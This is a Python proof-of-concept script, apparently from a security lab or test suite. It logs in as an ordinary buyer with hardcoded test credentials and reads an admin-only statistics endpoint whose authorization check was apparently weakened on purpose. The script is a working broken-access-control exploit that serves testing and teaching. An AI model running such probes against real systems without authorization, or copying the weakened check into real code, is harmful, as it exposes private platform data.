#!/usr/bin/env python3
"""
BAC-5 — Function-Level AuthZ: Admin Stats Accessible to Any User
Endpoint: GET /api/admin/stats
Auth    : Any authenticated user (was admin-only)

The stats endpoint dependency was changed from get_current_admin to
get_current_user, making platform-wide statistics (total users,
total orders, open disputes, active products) readable by anyone.

Usage
-----
    python poc_009_function_level_authz_stats.py
"""

import argparse
import sys
import requests

USER_EMAIL    = "charlie@mercury.com"
USER_PASSWORD = "Buyer123!"


def banner():
    print("=" * 60)
    print("  BAC-5 — Function-Level AuthZ: Admin Stats Exposed")
    print("  Endpoint: GET /api/admin/stats")
    print("=" * 60)


def login(base_url, email, password):
    resp = requests.post(f"{base_url}/api/auth/login",
                         json={"email": email, "password": password}, timeout=10)
    resp.raise_for_status()
    token = resp.json().get("access_token")
    if not token:
        print("[-] Login failed"); sys.exit(1)
    return token


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", default="http://localhost:8000")
    args = parser.parse_args()

    banner()
    token = login(args.url, USER_EMAIL, USER_PASSWORD)
    print(f"[+] Authenticated as {USER_EMAIL} (role=buyer)")

    resp = requests.get(f"{args.url}/api/admin/stats",
                        headers={"Authorization": f"Bearer {token}"}, timeout=10)

    if resp.status_code == 200:
        data = resp.json()
        print(f"[+] Admin stats endpoint returned 200!")
        print(f"    total_users    : {data.get('total_users')}")
        print(f"    total_products : {data.get('total_products')}")
        print(f"    total_orders   : {data.get('total_orders')}")
        print(f"    open_disputes  : {data.get('open_disputes')}")
    else:
        print(f"[-] Got {resp.status_code}: {resp.json()}")

    print("\n[+] Done.")


if __name__ == "__main__":
    main()
